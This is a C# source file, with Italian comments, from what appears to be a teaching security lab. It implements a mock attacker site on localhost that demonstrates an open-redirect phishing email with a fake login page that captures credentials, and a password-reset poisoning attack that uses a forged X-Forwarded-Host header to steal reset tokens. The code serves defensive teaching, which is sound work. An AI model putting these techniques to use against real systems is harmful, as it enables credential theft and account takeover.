using System.Net;
using Fortino.Web.Infrastructure;
using Fortino.Web.Lab;
using Microsoft.AspNetCore.Mvc;

namespace Fortino.Web.Chapters.Ch15.Attacker;

// Le pagine del truffatore per le prove a mano del capitolo 15. Le serve lo stesso Fortino, sulla
// porta subito dopo la sua (5002 accanto alla 5001, come il sito del truffatore del capitolo 4):
// per il browser è un altro sito. Fanno quello che un truffatore fa con i suoi strumenti:
//   /pannello            manda l'email trappola (15.1) e chiede il reset con l'Host falso (15.2);
//   /sessione-scaduta    la pagina dove arriva la vittima del 15.1, che imita Fortino;
//   /reset-password      la pagina dove arriva il link avvelenato del 15.2.
public static class AttackerPages
{
    public const string HttpClientName = "truffatore";

    // Le porte del sito del truffatore: 5002 per l'uso normale, 5102 per l'istanza delle foto del libro.
    private static readonly string[] Hosts = ["localhost:5002", "localhost:5102"];

    public static void Map(IEndpointRouteBuilder app)
    {
        var site = app.MapGroup("").RequireHost(Hosts).AllowAnonymous().DisableAntiforgery();

        site.MapGet("/pannello", (string? fatto) => Html(Panel(fatto)));

        // 15.1 L'email trappola a Ottica Lumen: un link al login VERO di Fortino, con ReturnUrl qui.
        site.MapPost("/pannello/email", async (HttpContext http, IEmailSender mail) =>
        {
            string link = $"{FortinoUrl(http)}/login?returnUrl={Uri.EscapeDataString($"https://{http.Request.Host}/sessione-scaduta")}";
            await mail.SendAsync("ordini@otticalumen.example", "La tua fattura di ottobre è pronta",
                "Gentile cliente,\n\nla fattura di ottobre è disponibile nel portale di Carta & Co.\n" +
                $"Accedi per vederla:\n{link}\n\nCordiali saluti,\nAmministrazione Carta & Co.");
            return Results.Redirect("/pannello?fatto=email");
        });

        // 15.2 La richiesta di reset per la vittima, con il nome host falsificato. Il truffatore la
        // manda con un suo strumento: qui lo fa il server di questa pagina. Il cookie della prova del
        // Laboratorio viaggia con la richiesta, così risponde la versione del codice scelta.
        site.MapPost("/pannello/reset", async ([FromForm] string? username, HttpContext http, IHttpClientFactory clients) =>
        {
            var request = new HttpRequestMessage(HttpMethod.Post, $"{FortinoUrl(http)}/forgot-password")
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string> { ["Username"] = username ?? "" }),
            };
            request.Headers.Add("X-Forwarded-Host", http.Request.Host.Value);
            string? trial = http.Request.Cookies[ActiveTrial.CookieName];
            if (trial is not null)
                request.Headers.Add("Cookie", $"{ActiveTrial.CookieName}={trial}");
            using var response = await clients.CreateClient(HttpClientName).SendAsync(request);
            return Results.Redirect($"/pannello?fatto=reset-{(int)response.StatusCode}");
        });

        site.MapGet("/sessione-scaduta", () => Html(ExpiredSession(null)));
        site.MapPost("/sessione-scaduta", ([FromForm] string? username, [FromForm] string? password) =>
            Html(ExpiredSession((username ?? "", password ?? ""))));

        site.MapGet("/reset-password", (string? token) => Html(StolenToken(token ?? "")));
    }

    // Fortino sta sulla porta subito prima di quella del truffatore.
    private static string FortinoUrl(HttpContext http) =>
        $"https://localhost:{(http.Request.Host.Port ?? 5002) - 1}";

    private static IResult Html(string body) => Results.Content(body, "text/html; charset=utf-8");

    private static string E(string text) => WebUtility.HtmlEncode(text);

    private static string Page(string title, string body, bool imitateFortino = false) =>
        $$"""
        <!doctype html><html lang="it"><head><meta charset="utf-8">
        <title>{{title}}</title>
        <style>
          body { font-family: system-ui, "Segoe UI", sans-serif; margin: 0; background: {{(imitateFortino ? "#F1F5F9" : "#f6f3ee")}}; color: #1F2937; }
          .flag { background: #7a1f1f; color: #fff; padding: 8px 16px; font-size: 14px; }
          .wrap { max-width: 760px; margin: 0 auto; padding: 32px; }
          .card { background: #fff; border: 1px solid #e0d8cc; border-radius: 12px; padding: 28px; margin-bottom: 20px; }
          .login { width: 380px; margin: 48px auto; background: #fff; border-radius: 6px; padding: 32px; box-shadow: 0 2px 6px rgba(0,0,0,.15); }
          label { display: block; font-size: 14px; margin: 12px 0 4px; }
          input { width: 100%; box-sizing: border-box; padding: 8px 10px; border: 1px solid #CBD5E1; border-radius: 6px; font: inherit; }
          button { margin-top: 16px; font-size: 15px; padding: 10px 20px; border: 0; border-radius: 6px; background: #0F766E; color: #fff; cursor: pointer; }
          .loot { background: #FDECEA; border: 1px solid #B42318; color: #B42318; border-radius: 8px; padding: 16px; }
          code { background: #f3f4f6; padding: 2px 6px; border-radius: 4px; }
        </style></head><body>
        <div class="flag">Pagina del Laboratorio di Fortino: finge di essere il sito di un truffatore (un altro indirizzo).</div>
        {{body}}</body></html>
        """;

    private static string Panel(string? done) => Page("Pannello del truffatore", $$"""
        <div class="wrap">
          <h1>Pannello del truffatore</h1>
          {{(done == "email" ? "<p class=\"loot\">Email trappola inviata a Ottica Lumen. Ora fai la vittima: apri la Posta finta di Fortino.</p>" : "")}}
          {{(done?.StartsWith("reset-") == true ? "<p class=\"loot\">Richiesta di reset mandata a Fortino con il nome host di questo sito. Ora fai la vittima: apri la Posta finta di Fortino.</p>" : "")}}
          <div class="card">
            <h2>Caso 15.1 · Email trappola</h2>
            <p>Manda a Ottica Lumen un'email che sembra di Carta &amp; Co. Il link porta al login vero di
            Fortino, ma dopo l'accesso rimanda qui.</p>
            <form method="post" action="/pannello/email"><button>Manda l'email trappola</button></form>
          </div>
          <div class="card">
            <h2>Caso 15.2 · Reset con l'Host falsificato</h2>
            <p>Chiede a Fortino il reset della password della vittima, dichiarando come nome del sito
            questo indirizzo (intestazione <code>X-Forwarded-Host</code>).</p>
            <form method="post" action="/pannello/reset">
              <label for="username">Nome utente della vittima</label>
              <input id="username" name="username" value="anna">
              <button>Chiedi il reset per la vittima</button>
            </form>
          </div>
        </div>
        """);

    private static string ExpiredSession((string User, string Password)? stolen) => Page("Accesso · Fortino",
        stolen is null
            ? """
              <div class="login">
                <h2 style="margin:0 0 4px">Fortino</h2>
                <p style="color:#64748B;margin:0 0 20px">Gestionale dimostrativo di Carta &amp; Co.</p>
                <p style="background:#FEF3C7;border-radius:6px;padding:10px 12px;font-size:14px">La sessione è scaduta. Per sicurezza, inserisci di nuovo le tue credenziali.</p>
                <form method="post" action="/sessione-scaduta">
                  <label for="username">Nome utente</label><input id="username" name="username">
                  <label for="password">Password</label><input id="password" name="password" type="password">
                  <button style="width:100%">Accedi</button>
                </form>
              </div>
              """
            : $$"""
              <div class="wrap"><div class="loot">
                <h2>Il truffatore ha ricevuto le credenziali</h2>
                <p>Nome utente: <code>{{E(stolen.Value.User)}}</code><br>Password: <code>{{E(stolen.Value.Password)}}</code></p>
                <p>La vittima era partita da un link al login vero di Fortino: dopo l'accesso, Fortino l'ha mandata qui.</p>
              </div></div>
              """,
        imitateFortino: stolen is null);

    private static string StolenToken(string token) => Page("Reimposta la password", $$"""
        <div class="wrap"><div class="loot">
          <h2>Il truffatore ha ricevuto il codice di reset</h2>
          <p>Codice: <code>{{E(token)}}</code></p>
          <p>Il link era nell'email vera di Fortino, ma puntava a questo sito. Con il codice il truffatore
          sceglie una nuova password per la vittima ed entra al suo posto.</p>
        </div></div>
        """);
}
